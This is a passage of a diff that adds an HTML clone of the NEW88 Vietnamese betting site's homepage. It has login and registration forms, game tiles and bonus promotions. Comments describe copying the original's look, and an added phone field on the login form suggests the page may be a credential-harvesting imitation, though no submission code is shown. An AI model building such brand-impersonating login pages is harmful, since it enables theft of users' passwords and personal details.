@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEW88 - Trang Chủ Chính Thức</title>
+    <link rel="icon" type="image/png" href="https://dgdga3.swuacktu.net/system-requirement/Web.Mobile/UK256-01.Mobile/Content/Views/Shared/images/logo.png?cacheCode=1513225">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .scrollbar-hide::-webkit-scrollbar { display: none; }
+        .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }
+        .bg-gradient-yellow { background: linear-gradient(85.62deg, #fead00 10.63%, #ffc54a 102.31%); }
+        /* Gradient vàng chuẩn theo ảnh mẫu */
+        .bg-gradient-gold-btn { background: linear-gradient(180deg, #fdf1a9 0%, #d49e3d 100%); }
+        /* Nền xanh đen chuẩn cho modal */
+        .bg-modal-main { background-color: #0b121e; }
+        .bg-modal-form { background-color: #121925; }
+        .bg-input-dark { background-color: #0b121e; }
+        body { background-color: #161a23; } 
+    </style>
+</head>
+<body class="text-white font-sans antialiased overflow-x-hidden">
+
+    <!-- MODAL ĐĂNG NHẬP / ĐĂNG KÝ (PC & MOBILE) -->
+    <div id="auth-modal" class="fixed inset-0 z-50 flex flex-col md:items-center md:justify-center bg-modal-main md:bg-black/85 hidden overflow-y-auto w-full h-full md:h-auto">
+        
+        <!-- Container Modal: Cố định kích thước WxH trên PC để tỷ lệ đẹp như ảnh gốc -->
+        <div class="relative w-full h-full min-h-screen md:min-h-0 md:w-[1060px] md:h-[760px] bg-modal-main md:border-[1.5px] md:border-[#d7a03f] md:rounded-3xl shadow-[0_0_40px_rgba(0,0,0,0.9)] flex flex-col md:flex-row overflow-hidden">
+            
+            <!-- Nút đóng modal: Vòng tròn trắng chữ X đen trên PC, tàng hình góc trên Mobile -->
+            <button onclick="closeAuthModal()" class="absolute right-3 top-3 w-8 h-8 rounded-full bg-transparent md:bg-white text-gray-400 md:text-black hover:opacity-80 flex items-center justify-center transition z-50">
+                <i class="fas fa-times text-2xl md:text-lg"></i>
+            </button>
+
+            <!-- ================= MOBILE HEADER MODAL ================= -->
+            <div class="md:hidden flex flex-col w-full h-full pb-5 overflow-y-auto z-10">
+                <section class="pt-8 px-4 flex flex-col items-center">
+                    <img class="h-[70px] w-auto mb-4 object-contain" src="https://dgdga3.swuacktu.net/system-requirement/Web.PortalNew/UK256-01/f1e6b490ec/images/cf1dc9112ba222c13300ffce6e52ca28.png" alt="Logo">
+                    <section class="mb-4 w-full">
+                        <p class="font-bold text-white text-lg mb-3">Đại Sứ Thương Hiệu</p>
+                        <ul class="flex flex-col gap-3">
+                            <li class="flex justify-between items-center text-sm font-semibold text-gray-200">
+                                <span>Mike Tyson (2026 - 2027)</span>
+                                <img src="https://dgdga3.swuacktu.net/system-requirement/Web.PortalNew/UK256-01/f1e6b490ec/images/514efe3fa29a8435af762f707703d490.png" class="h-8">
+                            </li>
+                            <li class="flex justify-between items-center text-sm font-semibold text-gray-200">
+                                <span>Ronaldinho (2024 - 2025)</span>
+                                <img src="https://dgdga3.swuacktu.net/system-requirement/Web.PortalNew/UK256-01/f1e6b490ec/images/67a3c71b2f0b32f4dceb5d171a8624e9.png" class="h-8">
+                            </li>
+                        </ul>
+                    </section>
+                </section>
+                <!-- Dùng chung form với PC bên dưới, css flex xử lý vị trí -->
+            </div>
+
+            <!-- ================= PC LEFT COLUMN (Đại Sứ Thương Hiệu) ================= -->
+            <!-- Nền sân vận động mờ bên trái -->
+            <div class="hidden md:flex flex-col w-[48%] relative p-6 z-10 justify-between bg-cover bg-left" ;">
+                <div class="absolute inset-0 bg-gradient-to-r from-transparent via-[#0b121e]/80 to-[#0b121e]"></div>
+                
+                <div class="relative z-10 flex flex-col items-center pt-2">
+                    
+                    <img src="https://dgdga3.swuacktu.net/system-requirement/Web.PortalNew/UK256-01/f1e6b490ec/images/cf1dc9112ba222c13300ffce6e52ca28.png" width="220" alt="Logo">
+                </div>
+                
+                <!-- Hình ảnh Đại sứ ở giữa (tùy chỉnh lại kích thước cho vừa vặn) -->
+                <div class="relative z-10 flex justify-center flex-grow items-center pb-4">
+                    <img src="daisuthuonghieu.jpg" alt="Đại Sứ Thương Hiệu" class="w-full object-contain drop-shadow-2xl">
+                </div>
+
+                <!-- Text & Signatures lấy từ code của bạn -->
+                <section class="relative z-10 mt-auto pl-2">
+                    <h2 class="font-bold text-2xl text-white mb-3">Đại Sứ Thương Hiệu</h2>
+                    <div class="space-y-2">
+                        <div class="flex justify-between items-center pr-4">
+                            <p class="text-[13px] text-gray-200 font-semibold">Mike Tyson (2026 - 2027)</p>
+                            <img src="https://dgdga3.swuacktu.net/system-requirement/Web.PortalNew/UK256-01/f1e6b490ec/images/514efe3fa29a8435af762f707703d490.png" class="h-7 opacity-90">
+                        </div>
+                        <div class="flex justify-between items-center pr-4">
+                            <p class="text-[13px] text-gray-200 font-semibold">Ronaldinho (2024 - 2025)</p>
+                            <img src="https://dgdga3.swuacktu.net/system-requirement/Web.PortalNew/UK256-01/f1e6b490ec/images/67a3c71b2f0b32f4dceb5d171a8624e9.png" class="h-7 opacity-90">
+                        </div>
+                    </div>
+                </section>
+            </div>
+
+            <!-- ================= PC & MOBILE RIGHT COLUMN (Form Container) ================= -->
+            <div class="flex flex-col w-full md:w-[60%] px-2 md:px-4 py-4 md:py-6 z-10 h-full bg-transparent md:bg-modal-form rounded-r-3xl">
+                
+                <div class="flex flex-col justify-center h-full max-md mx-auto ">
+                    <!-- Tab Switcher (Khung viền mỏng) -->
+                    <div class="flex p-[3px] rounded-[10px] mb-5 border border-gray-600/50 bg-[#121925] md:bg-modal-main">
+                        <button id="tab-reg-btn" onclick="switchAuthTab('register')" class="flex-1 py-2.5 rounded-[8px] font-bold text-[13px] transition text-gray-400 hover:text-white bg-transparent">ĐĂNG KÝ</button>
+                        <button id="tab-login-btn" onclick="switchAuthTab('login')" class="flex-1 py-2.5 rounded-[8px] font-bold text-[13px] transition bg-gradient-gold-btn text-black shadow-md">ĐĂNG NHẬP</button>
+                    </div>
+
+                    <!-- FORM ĐĂNG KÝ -->
+                    <form id="form-register" onsubmit="handleAuthSubmit(event, 'Đăng ký')" class="space-y-3 hidden">
+                        <div>
+                            <input type="text" id="reg-username" required placeholder="Tên đăng nhập" class="w-full bg-input-dark border border-gray-600/50 rounded-[5px] px-3.5 py-2.5 text-[13px] text-white focus:border-[#d7a03f] outline-none transition shadow-inner">
+                        </div>
+                        <div class="relative">
+                            <input type="password" id="reg-password" required placeholder="Mật Khẩu" class="w-full bg-input-dark border border-gray-600/50 rounded-[5px] px-3.5 py-2.5 text-[13px] text-white focus:border-[#d7a03f] outline-none transition shadow-inner">
+                            <i class="fas fa-eye-slash absolute right-3.5 top-[13px] text-gray-500 text-[13px] cursor-pointer"></i>
+                        </div>
+                        <div>
+                            <input type="text" id="reg-fullname" required placeholder="Họ tên thật" class="w-full bg-input-dark border border-gray-600/50 rounded-[5px] px-3.5 py-2.5 text-[13px] text-white focus:border-[#d7a03f] outline-none transition shadow-inner">
+                        </div>
+                        <div class="flex items-center bg-input-dark border border-gray-600/50 rounded-[5px] overflow-hidden shadow-inner">
+                            <div class="flex items-center gap-1.5 px-3 py-2.5 border-r border-gray-600/50 text-[13px] font-bold text-yellow-500">
+                                <span>🇻🇳</span> +84
+                            </div>
+                            <input type="tel" id="reg-phone" required placeholder="Nhập số điện thoại" class="w-full bg-transparent pl-3 py-2.5 text-[13px] text-white outline-none">
+                        </div>
+                        <div class="flex items-center text-[12px] text-white gap-2 pt-1 justify-center">
+                            <input type="checkbox" id="reg-terms" checked class="rounded-sm bg-transparent border-white text-yellow-500 focus:ring-0 w-3.5 h-3.5 cursor-pointer">
+                            <label for="reg-terms" class="cursor-pointer">Tôi đã hiểu <span class="text-yellow-500 hover:underline">Thỏa thuận đăng ký người dùng</span></label>
+                        </div>
+                        <button type="submit" class="w-full bg-gradient-gold-btn text-black font-extrabold py-3 rounded-[5px] uppercase text-[15px] shadow-md hover:brightness-110 transition mt-1">ĐĂNG KÝ NGAY</button>
+                    </form>
+
+                    <!-- FORM ĐĂNG NHẬP -->
+                    <form id="form-login" onsubmit="handleAuthSubmit(event, 'Đăng nhập')" class="space-y-3">
+                        <div>
+                            <input type="text" id="login-username" required placeholder="Tên đăng nhập" class="w-full bg-input-dark border border-gray-600/50 rounded-[5px] px-3.5 py-2.5 text-[13px] text-white focus:border-[#d7a03f] outline-none transition shadow-inner">
+                        </div>
+                        <div class="relative">
+                            <input type="password" id="login-password" required placeholder="Mật Khẩu" class="w-full bg-input-dark border border-gray-600/50 rounded-[5px] px-3.5 py-2.5 text-[13px] text-white focus:border-[#d7a03f] outline-none transition shadow-inner">
+                            <i class="fas fa-eye-slash absolute right-3.5 top-[13px] text-gray-500 text-[13px] cursor-pointer"></i>
+                        </div>
+                        <!-- Ô Nhập Số Điện Thoại Theo Yêu Cầu -->
+                        <div>
+                            <input type="tel" id="login-phone" required placeholder="Nhập số điện thoại" class="w-full bg-input-dark border border-gray-600/50 rounded-[5px] px-3.5 py-2.5 text-[13px] text-white focus:border-[#d7a03f] outline-none transition shadow-inner">
+                        </div>
+                        
+                        <div class="flex items-center justify-center text-[12px] text-white pt-1">
+                            <label class="flex items-center gap-2 cursor-pointer font-medium">
+                                <input type="checkbox" class="rounded-sm bg-white border-none text-yellow-500 focus:ring-0 w-3.5 h-3.5"> Ghi nhớ tài khoản mật khẩu?
+                            </label>
+                        </div>
+                        <p class="text-[11px] text-gray-400 text-center leading-[1.4]">Vui lòng tự bảo quản thông tin tài khoản<br>Để bảo đảm an toàn cho tài khoản của bạn</p>
+                        
+                        <button type="submit" class="w-full bg-gradient-gold-btn text-black font-extrabold py-3 rounded-[5px] uppercase text-[15px] shadow-md hover:brightness-110 transition mt-1">ĐĂNG NHẬP NGAY</button>
+
+                        <!-- Hai nút lấy lại mật khẩu (Viền mỏng màu vàng) -->
+                        <div class="grid grid-cols-2 gap-2 mt-3">
+                            <button type="button" class="bg-transparent border border-[#d7a03f] text-[#d7a03f] font-bold text-[10px] md:text-[11px] py-2 px-1 rounded-[5px] hover:bg-yellow-900/20 transition uppercase leading-[1.3] text-center">LẤY LẠI MẬT KHẨU<br>QUA SỐ ĐIỆN THOẠI</button>
+                            <button type="button" class="bg-transparent border border-[#d7a03f] text-[#d7a03f] font-bold text-[10px] md:text-[11px] py-2 px-1 rounded-[5px] hover:bg-yellow-900/20 transition uppercase leading-[1.3] text-center">LẤY LẠI MẬT KHẨU<br>QUA ĐỊA CHỈ EMAIL</button>
+                        </div>
+                    </form>
+
+                    <div class="flex-grow md:hidden mb-2"></div>
+
+                    <!-- Tải App Footer (Dùng chính ảnh bạn cung cấp để giống hệt bản gốc) -->
+                    <a target="_blank" href="https://new88app02.pages.dev/" class="block mt-4 w-full">
+                        <img src="https://dgdga3.swuacktu.net/system-requirement/Web.PortalNew/UK256-01/f1e6b490ec/images/5db75ef17d35308a4794cc7f8afa79fc.png" class="w-full object-contain hover:scale-[1.02] transition duration-300" alt="App Download">
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- THANH CÔNG CỤ CỐ ĐỊNH BÊN PHẢI (PC) -->
+    <div class="hidden md:flex flex-col fixed right-2 top-1/4 z-40 bg-[#1e232e] p-2 rounded-3xl border border-gray-700 shadow-2xl gap-2 w-20 text-center">
+        <div class="flex flex-col items-center justify-center p-2 rounded-2xl bg-gradient-to-b from-amber-400 to-amber-600 text-black cursor-pointer hover:scale-105 transition shadow-md">
+            <i class="fas fa-headset text-xl mb-1"></i>
+            <span class="text-[9px] font-black uppercase leading-tight">CSKH 24/7</span>
+        </div>
+        <div class="flex flex-col items-center justify-center p-2 rounded-2xl bg-gradient-to-b from-amber-400 to-amber-600 text-black cursor-pointer hover:scale-105 transition shadow-md">
+            <i class="fas fa-users text-xl mb-1"></i>
+            <span class="text-[9px] font-black uppercase leading-tight">Mời Bạn Bè</span>
+        </div>
+        <div class="flex flex-col items-center justify-center p-2 rounded-2xl bg-gradient-to-b from-amber-400 to-amber-600 text-black cursor-pointer hover:scale-105 transition shadow-md">
+            <i class="fas fa-gift text-xl mb-1"></i>
+            <span class="text-[9px] font-black uppercase leading-tight">Quà Tặng</span>
+        </div>
+        <div class="flex flex-col items-center justify-center p-2 rounded-2xl bg-gradient-to-b from-amber-400 to-amber-600 text-black cursor-pointer hover:scale-105 transition shadow-md">
+            <i class="fas fa-bell text-xl mb-1"></i>
+            <span class="text-[9px] font-black uppercase leading-tight">Tin Tức</span>
+        </div>
+        <div class="flex flex-col items-center justify-center p-2 rounded-2xl bg-gradient-to-b from-amber-400 to-amber-600 text-black cursor-pointer hover:scale-105 transition shadow-md">
+            <i class="fas fa-newspaper text-xl mb-1"></i>
+            <span class="text-[9px] font-black uppercase leading-tight">Khiếu Nại</span>
+        </div>
+        <div class="flex flex-col items-center justify-center p-2 rounded-2xl bg-gradient-to-b from-amber-400 to-amber-600 text-black cursor-pointer hover:scale-105 transition shadow-md">
+            <i class="fas fa-comment-dots text-xl mb-1"></i>
+            <span class="text-[9px] font-black uppercase leading-tight">Góp Ý</span>
+        </div>
+        <div class="flex items-center justify-center py-2 bg-gradient-to-r from-amber-500 to-red-500 rounded-full text-white cursor-pointer hover:opacity-90 transition shadow">
+            <i class="fas fa-chevron-right text-xs animate-pulse"></i>
+        </div>
+    </div>
+
+    <!-- WRAPPER CHÍNH -->
+    <div class="w-full min-h-screen relative pb-16 md:pb-0">
+        
+        <!-- HEADER -->
+        <header class="bg-[#111] border-b border-gray-800 sticky top-0 z-30">
+            <!-- Giao diện Mobile -->
+            <div class="header-wrap flex md:hidden h-14 w-screen items-center justify-between px-[9px] relative overflow-hidden">
+                <app-movie-bg key="httpFilm1" class="absolute inset-0 w-full h-full pointer-events-none z-0">
+                    <video autoplay loop muted playsinline class="w-full h-full object-cover">
+                        <source type="video/mp4" src="https://media.88new11.com/public/new88/site-khuyenmai/20260724102034.mp4">
+                    </video>
+                </app-movie-bg>
+                
+                <div class="block relative z-10 cursor-pointer">
+                    <i class="nav block text-white fas fa-bars text-lg"></i>
+                </div>
+                <a class="logo relative z-10 block h-8 w-28 bg-contain bg-no-repeat bg-center" href="/" style="background-image: url('https://dgdga3.swuacktu.net/system-requirement/Web.Mobile/UK256-01.Mobile/Content/Views/Shared/images/logo.png?cacheCode=1513225');"></a>
+                <a target="_blank" rel="nofollow noopener" class="app relative z-10 flex items-center h-full" href="https://new88app02.pages.dev/">
+                    <img class="max-h-8 object-contain" src="https://dgdga3.swuacktu.net/system-requirement/Web.MobileNew/UK256-01/f1e6b490ec/assets/images/header/app.png">
+                </a>
+            </div>
+
+            <!-- Giao diện PC -->
+            <div class="header-wrap hidden md:flex h-20 w-full items-center justify-between px-8 relative overflow-hidden">
+                <app-movie-bg key="httpFilm4" class="absolute inset-0 w-full h-full pointer-events-none z-0">
+                    <video autoplay loop muted playsinline class="w-full h-full object-cover">
+                        <source type="video/mp4" src="https://media.88new11.com/public/new88/site-khuyenmai/20260724102035.mp4">
+                    </video>
+                </app-movie-bg>
+
+                <div class="flex items-center gap-4 relative z-10">
+                    <a class="block h-12 w-36 bg-contain bg-no-repeat bg-center" href="/" style="background-image: url('https://dgdga3.swuacktu.net/system-requirement/Web.Mobile/UK256-01.Mobile/Content/Views/Shared/images/logo.png?cacheCode=1513225');"></a>
+                </div>
+
+                <!-- Đã đẩy lùi các nút vào trong (mr-32 lg:mr-40) để né thanh icon bên phải tuyệt đối -->
+                <div class="flex items-center gap-3 relative z-10 mr-32 lg:mr-40">
+                    <button type="button" onclick="openAuthModal('login')" class="bg-gradient-yellow text-black px-6 py-2.5 rounded-full font-bold text-sm shadow hover:scale-105 transition">Đăng nhập</button>
+                    <button type="button" onclick="openAuthModal('register')" class="border border-gray-400 text-white px-6 py-2.5 rounded-full font-bold text-sm hover:border-[#fead00] hover:text-[#fead00] transition bg-[#111]/80">Đăng ký</button>
+                    <button type="button" class="bg-gradient-yellow text-black px-6 py-2.5 rounded-full font-bold text-sm shadow hover:scale-105 transition">Chơi thử</button>
+                    <button type="button" class="bg-[#fead00] text-black w-10 h-10 rounded-full flex items-center justify-center shadow hover:scale-105 transition">
+                        <i class="fas fa-headset text-lg"></i>
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <!-- THANH ĐIỀU HƯỚNG PC -->
+        <nav class="hidden md:flex w-full bg-[#1e232e] border-b border-gray-700 justify-center shadow-md relative z-20">
+            <ul class="flex items-center gap-8 text-xs font-bold uppercase py-3 text-gray-300 tracking-wider">
+                <li class="text-[#fead00] cursor-pointer hover:text-yellow-400 transition flex items-center gap-1.5"><i class="fas fa-home"></i> Trang Chủ</li>
+                <li class="cursor-pointer hover:text-[#fead00] transition relative">CASINO</li>
+                <li class="cursor-pointer hover:text-[#fead00] transition relative">NỔ HŨ</li>
+                <li class="cursor-pointer hover:text-[#fead00] transition">BẮN CÁ</li>
+                <li class="cursor-pointer hover:text-[#fead00] transition">THỂ THAO</li>
+                <li class="cursor-pointer hover:text-[#fead00] transition">GAME BÀI</li>
+                <li class="cursor-pointer hover:text-[#fead00] transition">ĐÁ GÀ</li>
+                <li class="cursor-pointer hover:text-[#fead00] transition">XỔ SỐ</li>
+                <li class="cursor-pointer hover:text-[#fead00] transition relative">KHUYẾN MÃI</li>
+                <li class="cursor-pointer hover:text-[#fead00] transition">VIP</li>
+                <li class="cursor-pointer hover:text-[#fead00] transition relative">ĐẠI LÝ</li>
+                <li class="cursor-pointer hover:text-[#fead00] transition">THƯƠNG HIỆU</li>
+            </ul>
+        </nav>
+
+        <!-- BANNER XOAY VÒNG -->
+        <section class="w-full bg-black relative flex justify-center">
+            <div id="banner-slider" class="w-full relative h-[180px] xs:h-[220px] sm:h-[350px] md:h-[500px] overflow-hidden flex items-center justify-center">
+                <img src="banner2.jpg" class="banner-slide absolute inset-0 w-full h-full object-cover transition-opacity duration-700 opacity-100">
+                <img src="banner3.jpg" class="banner-slide absolute inset-0 w-full h-full object-cover transition-opacity duration-700 opacity-0">
+                <img src="banner4.jpg" class="banner-slide absolute inset-0 w-full h-full object-cover transition-opacity duration-700 opacity-0">
+            </div>
+        </section>
+
+        <!-- NÚT AUTH CHO MOBILE -->
+        <section class="flex md:hidden gap-3 px-4 py-1.5 justify-center bg-[#1a1e29]">
+            <button onclick="openAuthModal('register')" class="flex-1 bg-gradient-yellow text-black font-bold py-3 rounded-full shadow-lg uppercase text-sm tracking-wide">ĐĂNG KÝ</button>
+            <button onclick="openAuthModal('login')" class="flex-1 border-2 border-[#fead00] text-[#fead00] font-bold py-3 rounded-full shadow-lg uppercase text-sm tracking-wide">ĐĂNG NHẬP</button>
+        </section>
+
+        <!-- THÔNG BÁO CHẠY -->
+        <section class="w-full px-4 md:px-8 flex items-center mt-1 mb-2">
+            <i class="fas fa-volume-up text-[#fead00] text-lg mr-2"></i>
+            <div class="flex-1 overflow-hidden bg-black/40 md:bg-transparent rounded px-2 py-1">
+                <marquee class="text-xs md:text-sm text-gray-200" scrollamount="5">
+                    🤝 Nạp đầu nhận ưu đãi lên đến 8,888K 👉 THỨ 2 NGÀY VÀNG - Gia nhập NEW88 ngay hôm nay!
+                </marquee>
+            </div>
+        </section>
+
+        <!-- ================= KHU VỰC MOBILE ================= -->
+        <div class="md:hidden">
+            <section class="w-full px-4 mb-6">
+                <div class="flex w-full gap-1 py-2 items-center justify-between mb-4">
+                    <div class="bg-gradient-yellow text-black px-3 py-1.5 rounded-full whitespace-nowrap font-extrabold text-[11px] flex items-center shadow flex-1 justify-center">
+                        <i class="fas fa-fire mr-1 text-red-600"></i> HOT
+                    </div>
+                    <div class="bg-[#2a3040] text-gray-300 px-3 py-1.5 rounded-full whitespace-nowrap font-medium text-[11px] flex-1 text-center">Casino</div>
+                    <div class="bg-[#2a3040] text-gray-300 px-3 py-1.5 rounded-full whitespace-nowrap font-medium text-[11px] flex-1 text-center">Nổ Hũ</div>
+                    <div class="bg-[#2a3040] text-gray-300 px-3 py-1.5 rounded-full whitespace-nowrap font-medium text-[11px] flex-1 text-center">Bắn Cá</div>
+                    <div class="bg-[#2a3040] text-gray-300 px-3 py-1.5 rounded-full whitespace-nowrap font-medium text-[11px] flex-1 text-center">Thể Thao</div>
+                </div>
+
+                <div class="grid grid-cols-3 gap-2.5">
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="setructuyen.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-[9px] font-bold uppercase truncate px-1 block">SE Trực Tuyến</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="dgtructuyen.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-[9px] font-bold uppercase truncate px-1 block">DG Trực Tuyến</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="sabathethao.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-[9px] font-bold uppercase truncate px-1 block">SABA Thể Thao</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="quyetchientienthuong.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-[9px] font-bold uppercase truncate px-1 block">Quyết Chiến Tiền</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="khobauaztec.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-[9px] font-bold uppercase truncate px-1 block">Kho Báu Aztec</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="quyetchientienthuong2.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-[9px] font-bold uppercase truncate px-1 block">Quyết Chiến 2</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="duongmatchuoc2.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-[9px] font-bold uppercase truncate px-1 block">Đường Mạt Chược 2</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="duongmatchuoc.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-[9px] font-bold uppercase truncate px-1 block">Đường Mạt Chược</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="banca.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-[9px] font-bold uppercase truncate px-1 block">Bắn Cá</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="firegod.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-[9px] font-bold uppercase truncate px-1 block">Fire God</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="taixiu.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-[9px] font-bold uppercase truncate px-1 block">Tài Xỉu</span></div></div>
+                    <div class="bg-[#1e232e] rounded-lg overflow-hidden relative border border-gray-800"><img src="neko.jpg" class="w-full aspect-square object-cover"><div class="absolute bottom-0 w-full bg-black/90 text-center py-1"><span class="text-[9px] font-bold uppercase truncate px-1 block">Neko May Mắn</span></div></div>
+                </div>
+            </section>
+
+            <section class="w-full px-4 mb-6">
+                <img src="bannerbacarat.jpg" alt="Baccarat" class="w-full rounded-xl shadow-lg border border-gray-700">
+            </section>
+            <div class="bg-black aspect-video rounded-xl border border-gray-500 overflow-hidden shadow-inner flex items-center justify-center mb-6">
+    <video controls autoplay muted loop playsinline class="w-full h-full object-cover">
+        <source src="media" type="video/mp4">
+        <source src="media.mp4" type="video/mp4">
+        Trình duyệt của bạn không hỗ trợ video.
+    </video>
+</div>
+            <section class="w-full px-4 mb-6">
+                <div class="bg-[#1e232e] rounded-xl p-4 border border-gray-700 text-center">
+                    <h3 class="text-yellow-500 font-bold uppercase mb-3">Tải App NEW88</h3>
+                    <div class="flex justify-center gap-3">
+                        <img src="appstore.jpg" alt="Appstore" class="h-10">
+                        <img src="googleplay.jpg" alt="Google Play" class="h-10">
+                    </div>
+                </div>
+            </section>
+
+            <section class="w-full px-4 mb-6">
+                <h2 class="text-yellow-500 font-black text-center text-lg uppercase mb-3 tracking-wider">ĐẠI SỨ THƯƠNG HIỆU ĐỘC QUYỀN</h2>
+                <div class="bg-[#1e232e] rounded-2xl p-3 border border-gray-700 shadow-lg flex justify-center">
+                    <img src="daisuthuonghieu.jpg" alt="Đại Sứ Thương Hiệu" class="w-full h-auto object-contain rounded-xl">
+                </div>
+            </section>
+
+            <section class="w-full px-4 mb-8">
+                <div class="bg-[#1e232e] rounded-xl p-4 border border-gray-700 text-center">
+                    <h3 class="text-yellow-400 font-bold text-sm uppercase mb-2">NEW88 - NỀN TẢNG CÁ CƯỢC TRỰC TUYẾN CHẤT LƯỢNG CAO</h3>
+                    <div id="mobile-toggle-content" class="text-xs text-gray-300 text-left mt-2 hidden leading-relaxed space-y-2">
+                        <p>NEW88 là nhà cái cá cược trực tuyến chất lượng cao, được cấp giấy phép hợp pháp bởi Isle of Man và Khu kinh tế Cagayan and Freeport. Với hơn 10 triệu người chơi, NEW88 không ngừng khẳng định vị thế dẫn đầu trong ngành cá cược trực tuyến toàn cầu.</p>
+                        <p class="font-bold text-yellow-400">TẠI SAO CHỌN NEW88?</p>
+                        <p>Uy tín hàng đầu: NEW88 là thương hiệu có trụ sở chính tại Luân Đôn, Anh, luôn đặt chất lượng và trải nghiệm người dùng lên hàng đầu.</p>
+                        <p>Bảo mật tuyệt đối: Hệ thống bảo mật Secure Socket (SS 128-bit) hiện đại, đảm bảo mọi thông tin cá nhân được mã hóa và lưu trữ an toàn.</p>
+                    </div>
+                    <button onclick="toggleMobileContent()" class="mt-3 bg-[#161a23] border border-gray-600 text-yellow-400 w-10 h-8 rounded-full flex items-center justify-center mx-auto hover:bg-gray-800 transition">
+                        <i id="toggle-icon" class="fas fa-chevron-down"></i>
+                    </button>
+                </div>
+            </section>
+        </div>
+
+
+        <!-- ================= KHU VỰC PC ================= -->
+        <div class="hidden md:block w-full">
+            <section class="w-full px-8 mb-12">
+                <h2 class="text-yellow-500 font-black text-center text-3xl uppercase mb-8 tracking-wider">NHỮNG TÍNH NĂNG VƯỢT TRỘI</h2>
+                <div class="grid grid-cols-4 gap-6 text-center border-t border-b border-gray-800 py-6 bg-[#1e232e]/50 rounded-xl">
+                    <div class="flex flex-col items-center">
+                        <img src="thuonghieuuytin.jpg" alt="Thương Hiệu Uy Tín" class="w-16 h-16 object-contain mb-3">
+                        <h4 class="font-bold text-yellow-500 text-sm uppercase">Thương Hiệu Uy Tín</h4>
+                        <p class="text-[11px] text-gray-400 mt-1">Được nhiều người tin tưởng lựa chọn</p>
+                    </div>
+                    <div class="flex flex-col items-center">
+                        <img src="sanphamdadang.jpg" alt="Đa Dạng Sản Phẩm" class="w-16 h-16 object-contain mb-3">
+                        <h4 class="font-bold text-yellow-500 text-sm uppercase">Đa Dạng Sản Phẩm</h4>
+                        <p class="text-[11px] text-gray-400 mt-1">Casino, Thể Thao, Nổ Hũ, Bắn Cá...</p>
+                    </div>
+                    <div class="flex flex-col items-center">
+                        <img src="anninhbaomat.jpg" alt="An Ninh Bảo Mật" class="w-16 h-16 object-contain mb-3">
+                        <h4 class="font-bold text-yellow-500 text-sm uppercase">An Ninh Bảo Mật</h4>
+                        <p class="text-[11px] text-gray-400 mt-1">Bảo mật thông tin tuyệt đối</p>
+                    </div>
+                    <div class="flex flex-col items-center">
+                        <img src="giaodichnhanhchong.jpg" alt="Giao Dịch Nhanh Chóng" class="w-16 h-16 object-contain mb-3">
+                        <h4 class="font-bold text-yellow-500 text-sm uppercase">Giao Dịch Nhanh Chóng</h4>
+                        <p class="text-[11px] text-gray-400 mt-1">Xử lý thần tốc trong vòng 3-5 phút</p>
+                    </div>
+                </div>
+            </section>
+
+            <section class="w-full px-8 mb-12">
+                <h2 class="text-yellow-500 font-black text-center text-3xl uppercase mb-8 tracking-wider">ĐẠI SỨ THƯƠNG HIỆU ĐỘC QUYỀN</h2>
+                <div class="bg-[#1e232e] rounded-2xl p-6 border border-gray-700 shadow-xl flex items-center gap-6">
+                    <div class="w-1/2 flex flex-col items-center">
+                        <img src="daisuthuonghieu.jpg" alt="Đại Sứ Thương Hiệu" class="w-full max-w-sm h-auto mb-4 object-contain rounded-lg">
+                        <div class="flex justify-around w-full gap-4 mt-2">
+                            <div class="flex flex-col items-center text-center">
+                                <img src="miketyson.jpg" alt="Mike Tyson" class="h-24 object-contain">
+                                <span class="text-xs text-yellow-400 mt-1 font-bold">Mike Tyson</span>
+                                <span class="text-[10px] text-gray-400">2026 - 2027</span>
+                            </div>
+                            <div class="flex flex-col items-center text-center">
+                                <img src="ronaldinho.jpg" alt="Ronaldinho" class="h-24 object-contain">
+                                <span class="text-xs text-yellow-400 mt-1 font-bold">Ronaldinho</span>
+                                <span class="text-[10px] text-gray-400">2024 - 2025</span>
+                            </div>
